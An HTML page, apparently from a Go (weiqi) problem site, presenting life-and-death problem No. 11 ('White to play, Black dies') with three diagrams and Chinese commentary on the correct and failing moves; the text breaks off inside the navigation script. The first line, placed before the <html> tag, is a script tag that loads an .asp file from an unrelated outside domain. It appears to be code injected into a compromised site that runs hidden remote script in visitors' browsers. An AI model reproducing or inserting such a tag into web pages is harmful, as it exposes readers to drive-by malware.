<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第11型 白先黑死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体">  <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第11型      白先黑死</span></font><!--mstheme--></font></h1>        <div align="center">          <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">          <tr>            <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_1.png" width="252" height="232"><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_2.png" width="252" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1扑是正解。接下来，黑如a位提，问题就简单了。黑2跳，是最强的抵抗，白要冷静……</span></font>        <p>　<!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1点，只此一手。黑2如打，白3长，黑死。黑2如于3位提，白2位长即可。白1不可随手于3位长，否则黑a位提可净活。</span></font><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_3.png" width="252" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1透点则不行。黑2靠，白3挖，黑4打，结果成劫。白1如于3位点，黑2位夹也是劫。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No8/No8.htm" language="JavaScript" onmouseover="if(MSFPhover) document['MSFPnav1'].src=MSFP
